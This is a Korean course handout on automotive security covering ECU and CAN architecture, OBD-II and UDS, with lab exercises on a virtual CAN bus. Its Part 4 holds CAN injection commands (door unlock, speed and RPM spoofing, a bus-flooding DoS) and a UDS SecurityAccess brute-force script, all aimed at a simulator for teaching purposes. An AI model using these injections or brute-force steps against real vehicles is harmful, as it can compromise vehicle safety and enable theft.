# Week 13: 자동차 보안

## 학습 목표
- 자동차 전자 시스템의 아키텍처와 ECU 구조를 이해한다
- CAN 버스 프로토콜의 동작 원리와 보안 취약점을 분석한다
- OBD-II 인터페이스를 통한 차량 정보 수집을 실습한다
- UDS(Unified Diagnostic Services)를 이용한 ECU 진단을 학습한다
- 가상 CAN 환경에서 메시지 분석 및 인젝션을 수행한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | CAN 시뮬레이터 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

> Linux vcan(Virtual CAN) 인터페이스를 사용하여 실습합니다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 자동차 보안 이론 (Part 1) | 강의 |
| 0:40-1:10 | CAN 버스 심화 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | Virtual CAN 실습 (Part 3) | 실습 |
| 2:00-2:40 | CAN 메시지 분석 및 공격 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 자동차 보안 대책 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

## Part 1: 자동차 보안 이론 (40분)

### 1.1 자동차 전자 시스템 아키텍처

```
┌─────────────────────────────────────────────┐
│              Vehicle Network                 │
├──────────────────┬──────────────────────────┤
│    Powertrain    │      Body/Comfort        │
│   CAN (HS 500k) │   CAN (LS 125k)          │
│  ┌────┐ ┌────┐  │  ┌────┐ ┌─────┐ ┌─────┐│
│  │ECM │ │TCM │  │  │BCM │ │Seat │ │Light││
│  │엔진│ │변속│  │  │바디│ │시트 │ │조명 ││
│  └────┘ └────┘  │  └────┘ └─────┘ └─────┘│
├──────────────────┼──────────────────────────┤
│   Chassis/Safety │     Infotainment         │
│   CAN (HS 500k) │   MOST/Ethernet          │
│  ┌────┐ ┌────┐  │  ┌────┐ ┌─────┐         │
│  │ABS │ │ESP │  │  │HU  │ │Navi │         │
│  │브레│ │안정│  │  │헤드│ │내비 │         │
│  │이크│ │제어│  │  │유닛│ │     │         │
│  └────┘ └────┘  │  └────┘ └─────┘         │
├──────────────────┴──────────────────────────┤
│              Gateway ECU                     │
│    (CAN 도메인 간 브릿지 + 필터링)          │
├──────────────────────────────────────────────┤
│  OBD-II Port ←── 외부 진단 접점             │
│  Telematics (4G/5G) ←── 원격 접근           │
│  V2X (DSRC/C-V2X) ←── 차량 간 통신         │
└──────────────────────────────────────────────┘
```

### 1.2 자동차 네트워크 프로토콜

| 프로토콜 | 속도 | 용도 | 보안 |
|----------|------|------|------|
| CAN 2.0 | 125k-1M bps | 파워트레인, 새시 | 없음 |
| CAN FD | 최대 8M bps | 차세대 CAN | 없음 (SecOC 가능) |
| LIN | 20k bps | 센서, 액추에이터 | 없음 |
| FlexRay | 10M bps | X-by-Wire | 제한적 |
| MOST | 24.8M bps | 멀티미디어 | 없음 |
| Automotive Ethernet | 100M-10G bps | ADAS, 카메라 | MACsec |

### 1.3 CAN 버스 보안 위협

| 위협 | 설명 | 영향 |
|------|------|------|
| 스니핑 | CAN 메시지 도청 | 차량 상태 정보 유출 |
| 스푸핑 | 위조 CAN 메시지 주입 | ECU 오동작 |
| DoS | 최고 우선순위 프레임 범람 | 정상 통신 마비 |
| 리플레이 | 캡처한 메시지 재전송 | 도어 잠금 해제 등 |
| 퍼징 | 임의 CAN 메시지 전송 | ECU 크래시/리부팅 |

### 1.4 주요 자동차 해킹 사례

**Jeep Cherokee 원격 해킹 (2015, Charlie Miller & Chris Valasek):**
1. 인포테인먼트 시스템의 셀룰러 연결 취약점 발견
2. 원격 코드 실행 → CAN 버스 접근
3. 핸들, 브레이크, 가속 원격 제어 시연
4. 1.4백만 대 리콜

**Tesla Model S (2016, Keen Security Lab):**
1. WiFi + 브라우저 취약점 체인
2. 게이트웨이 ECU 펌웨어 변조
3. 원격 브레이크 작동 시연
4. OTA 업데이트로 패치

---

## Part 2: CAN 버스 심화 (30분)

### 2.1 CAN 프레임 구조

```
┌─────────────────────────────────────────────────────┐
│ SOF │ Arbitration │ Control │  Data   │ CRC │ACK│EOF│
│(1b) │   ID(11b)   │ (6b)   │(0-64b)  │(16b)│(2b)│(7b)│
└─────────────────────────────────────────────────────┘

CAN 2.0A (Standard): 11비트 ID
CAN 2.0B (Extended): 29비트 ID
```

**CAN ID 우선순위:**
```
ID가 작을수록 우선순위 높음 (버스 경합 시)

0x000: 최고 우선순위 (진단)
0x100-0x1FF: 파워트레인 (엔진, 변속)
0x200-0x3FF: 새시 (브레이크, 스티어링)
0x400-0x5FF: 바디 (도어, 조명)
0x600-0x7FF: 인포테인먼트
0x7DF: OBD-II 요청 (브로드캐스트)
0x7E0-0x7E7: 진단 요청 (ECU별)
0x7E8-0x7EF: 진단 응답 (ECU별)
```

### 2.2 OBD-II (On-Board Diagnostics)

**OBD-II 핀 배치:**
```
     ┌──────────────────┐
     │ 1  2  3  4  5  6 │
     │  7  8  9 10 11   │
     │ 12 13 14 15 16   │
     └──────────────────┘

주요 핀:
  Pin 4: Chassis GND
  Pin 5: Signal GND
  Pin 6: CAN-H (High-Speed CAN)
  Pin 7: K-Line (ISO 9141)
  Pin 14: CAN-L
  Pin 16: Battery Power (+12V)
```

### 2.3 UDS (Unified Diagnostic Services)

| 서비스 ID | 이름 | 설명 |
|-----------|------|------|
| 0x10 | DiagnosticSessionControl | 진단 세션 전환 |
| 0x11 | ECUReset | ECU 리셋 |
| 0x22 | ReadDataByIdentifier | 데이터 읽기 |
| 0x27 | SecurityAccess | 보안 접근 (시드-키) |
| 0x2E | WriteDataByIdentifier | 데이터 쓰기 |
| 0x31 | RoutineControl | 루틴 실행 |
| 0x34 | RequestDownload | 다운로드 요청 |
| 0x36 | TransferData | 데이터 전송 |
| 0x3E | TesterPresent | 세션 유지 |

---

## Part 3: Virtual CAN 실습 (40분)

### 3.1 Virtual CAN 인터페이스 설정

```bash
# vcan 모듈 로드 및 인터페이스 생성
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# can-utils 설치
sudo apt install -y can-utils

# CAN 인터페이스 확인
ip link show vcan0
```

### 3.2 CAN 메시지 송수신

```bash
# CAN 메시지 모니터링 (터미널 1)
candump vcan0 &

# CAN 메시지 전송 (터미널 2)
# 엔진 RPM (ID 0x0C0, RPM=3000)
cansend vcan0 0C0#0BB8000000000000

# 차량 속도 (ID 0x0D0, 60 km/h)
cansend vcan0 0D0#003C000000000000

# 도어 상태 (ID 0x400, 모든 도어 잠금)
cansend vcan0 400#FF00000000000000

# 조명 제어 (ID 0x420, 전조등 ON)
cansend vcan0 420#0100000000000000
```

### 3.3 차량 시뮬레이터

```bash
cat << 'PYEOF' > /tmp/car_simulator.py
#!/usr/bin/env python3
"""가상 차량 CAN 시뮬레이터"""
import subprocess
import time
import random
import struct
import os

CAN_IF = "vcan0"

def send_can(can_id, data_hex):
    """CAN 메시지 전송"""
    cmd = f"cansend {CAN_IF} {can_id:03X}#{data_hex}"
    os.system(cmd)

def simulate_vehicle():
    print("[*] 차량 CAN 시뮬레이터 시작")
    
    speed = 0
    rpm = 800
    fuel = 75
    engine_temp = 85
    gear = 0  # P
    
    while True:
        # 엔진 RPM (CAN ID 0x0C0)
        rpm_data = struct.pack('>H', rpm) + b'\x00' * 6
        send_can(0x0C0, rpm_data.hex())
        
        # 차량 속도 (CAN ID 0x0D0)
        speed_data = struct.pack('>H', int(speed * 100)) + b'\x00' * 6
        send_can(0x0D0, speed_data.hex())
        
        # 엔진 온도 (CAN ID 0x0E0)
        temp_data = struct.pack('>H', engine_temp * 10) + b'\x00' * 6
        send_can(0x0E0, temp_data.hex())
        
        # 연료량 (CAN ID 0x0F0)
        fuel_data = struct.pack('>B', fuel) + b'\x00' * 7
        send_can(0x0F0, fuel_data.hex())
        
        # 도어 상태 (CAN ID 0x400)
        # Bit 0: 운전석, Bit 1: 조수석, Bit 2: 뒷좌석L, Bit 3: 뒷좌석R, Bit 4: 트렁크
        door_state = 0x1F  # 모두 잠금
        send_can(0x400, f"{door_state:02X}00000000000000")
        
        # 조명 상태 (CAN ID 0x420)
        send_can(0x420, "0100000000000000")  # 전조등 ON
        
        # 값 변동 시뮬레이션
        speed += random.uniform(-2, 3)
        speed = max(0, min(speed, 180))
        rpm = int(800 + speed * 30 + random.randint(-100, 100))
        engine_temp = 85 + random.randint(-3, 5)
        fuel = max(0, fuel - random.uniform(0, 0.01))
        
        time.sleep(0.1)

if __name__ == '__main__':
    simulate_vehicle()
PYEOF

python3 /tmp/car_simulator.py &
```

---

## Part 4: CAN 메시지 분석 및 공격 (40분)

### 4.1 CAN 트래픽 분석

```bash
# CAN 트래픽 캡처 (10초)
timeout 10 candump vcan0 > /tmp/can_capture.txt 2>/dev/null
echo "[+] CAN 캡처 완료"

# CAN ID별 통계
cat << 'PYEOF' > /tmp/can_analyzer.py
#!/usr/bin/env python3
"""CAN 트래픽 분석기"""
from collections import Counter
import struct

print("=== CAN 트래픽 분석 ===\n")

messages = []
try:
    with open('/tmp/can_capture.txt') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 3 and '#' in parts[2]:
                can_id, data = parts[2].split('#')
                messages.append({'id': can_id, 'data': data})
except FileNotFoundError:
    # 시뮬레이션 데이터
    messages = [
        {'id': '0C0', 'data': '0BB8000000000000'},
        {'id': '0D0', 'data': '003C000000000000'},
        {'id': '0E0', 'data': '035A000000000000'},
        {'id': '400', 'data': '1F00000000000000'},
    ] * 25

print(f"총 메시지 수: {len(messages)}")

# CAN ID별 빈도
id_counter = Counter(m['id'] for m in messages)
print(f"\nCAN ID별 빈도:")
for can_id, count in id_counter.most_common(15):
    bar = '#' * min(count, 30)
    # ID 해석
    descriptions = {
        '0C0': 'Engine RPM',
        '0D0': 'Vehicle Speed',
        '0E0': 'Engine Temp',
        '0F0': 'Fuel Level',
        '400': 'Door Status',
        '420': 'Lighting',
        '7DF': 'OBD-II Request',
    }
    desc = descriptions.get(can_id.upper(), 'Unknown')
    print(f"  0x{can_id}: {count:5d} | {desc:20s} | {bar}")

# 데이터 디코딩 시도
print(f"\n최신 데이터 디코딩:")
latest = {}
for m in messages:
    latest[m['id']] = m['data']

for can_id, data in latest.items():
    try:
        raw = bytes.fromhex(data)
        val = struct.unpack('>H', raw[:2])[0]
        desc = descriptions.get(can_id.upper(), 'Unknown')
        print(f"  0x{can_id} ({desc}): raw={data}, value={val}")
    except:
        pass
PYEOF

python3 /tmp/can_analyzer.py
```

### 4.2 CAN 인젝션 공격

```bash
# 도어 잠금 해제 (Door Unlock)
echo "[!] 도어 잠금 해제 명령 주입"
cansend vcan0 400#0000000000000000  # 모든 도어 잠금 해제

# 속도 표시 변조
echo "[!] 속도 표시 0으로 변조"
cansend vcan0 0D0#0000000000000000

# RPM 경고 유발
echo "[!] RPM 레드존 주입"
cansend vcan0 0C0#FFFF000000000000  # RPM = 65535

# CAN DoS (최고 우선순위 메시지 범람)
echo "[!] CAN 버스 DoS (Dominant State 유지)"
for i in $(seq 1 100); do
  cansend vcan0 000#0000000000000000
done

# 진단 명령 (OBD-II)
echo "[!] OBD-II 진단 요청"
cansend vcan0 7DF#0201050000000000  # Mode 01 PID 05 (엔진 냉각수 온도)
```

### 4.3 UDS 공격 시뮬레이션

```bash
cat << 'PYEOF' > /tmp/uds_attack.py
#!/usr/bin/env python3
"""UDS 공격 시뮬레이션"""
import os
import time

CAN_IF = "vcan0"

print("=== UDS 진단 공격 시뮬레이션 ===\n")

# ECU 진단 세션 요청
print("[1] 진단 세션 전환 (Extended)")
os.system(f"cansend {CAN_IF} 7E0#021001000000000")
time.sleep(0.1)

# TesterPresent (세션 유지)
print("[2] TesterPresent")
os.system(f"cansend {CAN_IF} 7E0#023E00000000000")
time.sleep(0.1)

# SecurityAccess - 시드 요청
print("[3] SecurityAccess - Seed 요청")
os.system(f"cansend {CAN_IF} 7E0#022701000000000")
time.sleep(0.1)

# SecurityAccess - 키 전송 (브루트포스)
print("[4] SecurityAccess - Key 브루트포스 시뮬레이션")
for key in range(0, 5):
    key_hex = f"{key:08X}"
    print(f"    시도: Key={key_hex}")
    os.system(f"cansend {CAN_IF} 7E0#062702{key_hex}00")
    time.sleep(0.05)

# ECUReset
print("[5] ECU 리셋 명령")
os.system(f"cansend {CAN_IF} 7E0#021101000000000")

# DTC 읽기 (Diagnostic Trouble Codes)
print("[6] DTC 읽기")
os.system(f"cansend {CAN_IF} 7E0#0319020000000000")

print("\n[!] UDS 공격 시뮬레이션 완료")
print("[!] 실제 환경에서는 SecurityAccess 키 브루트포스로 ECU 잠금 가능")
PYEOF

python3 /tmp/uds_attack.py
```

---

## Part 5: 자동차 보안 대책 (30분)

### 5.1 자동차 보안 표준

| 표준 | 대상 | 내용 |
|------|------|------|
| ISO/SAE 21434 | 자동차 사이버보안 | 개발 라이프사이클 보안 |
| UNECE WP.29 R155 | 규제 | 사이버보안 관리 시스템 |
| UNECE WP.29 R156 | 규제 | 소프트웨어 업데이트 관리 |
| AUTOSAR SecOC | CAN 보안 | 메시지 인증 (MAC) |

### 5.2 SecOC (Secure Onboard Communication)

```
기존 CAN:
  [CAN ID] [Data 8B]

SecOC 적용:
  [CAN ID] [Data 4B] [Freshness 2B] [MAC 2B]

- Freshness: 리플레이 방지 (카운터/타임스탬프)
- MAC: 메시지 인증 코드 (CMAC-AES)
- 키 관리: SHE (Secure Hardware Extension) / HSM
```

### 5.3 자동차 보안 체크리스트

| 계층 | 대책 |
|------|------|
| ECU 보안 부트 | Secure Boot + HSM |
| CAN 인증 | SecOC (MAC 기반) |
| 게이트웨이 | CAN 도메인 분리 + 필터링 |
| OBD-II 보안 | 진단 접근 제한 |
| 무선 보안 | 텔레매틱스 TLS, V2X PKI |
| 소프트웨어 | 코드 서명, 안전한 OTA |
| 침입 탐지 | CAN IDS (이상 탐지) |

---

## Part 6: 과제 안내 (20분)

### 과제

- 가상 CAN 환경에서 차량 시뮬레이터의 CAN 메시지를 분석하시오
- CAN 메시지 인젝션으로 도어 잠금/해제, 속도 변조를 수행하시오
- SecOC를 시뮬레이션하는 Python 코드를 작성하시오

---

## 참고 자료

- CAN 사양: https://www.iso.org/standard/63648.html
- ISO/SAE 21434: 자동차 사이버보안 엔지니어링
- Car Hacker's Handbook (Craig Smith)
- OpenGarages: http://opengarages.org/
- ICSim (Instrument Cluster Simulator): https://github.com/zombieCraig/ICSim

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (13주차) 학습 주제와 직접 연관된 *실제* incident:

### Data Theft (T1041) — 99.99% 의 dataset 패턴

> **출처**: WitFoo Precinct 6 / `complete-mission cluster` (anchor: `anc-a0364e702393`) · sanitized
> **시점**: 다중 (전체 99.99%)

**관찰**: Precinct 6 의 incident 10,442건 중 mo_name=Data Theft + lifecycle=complete-mission 이 99.99%. T1041 (Exfiltration over C2 Channel).

**MITRE ATT&CK**: **T1041 (Exfiltration over C2 Channel)**

**IoC**:
  - `다양한 src→dst (sanitized)`
  - `suspicion≥0.7`

**학습 포인트**:
- *가장 많이 일어나는 공격* 의 baseline — 모든 IR 시나리오의 출발점
- C2 채널 (HTTP/HTTPS/DNS) 에 데이터 mixed → 정상 트래픽 위장
- 탐지: outbound 에 데이터 흐름 모니터링 (bytes_out 분포), CTI feed 매칭
- 방어: DLP (Data Loss Prevention), egress filter, 데이터 분류·암호화


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
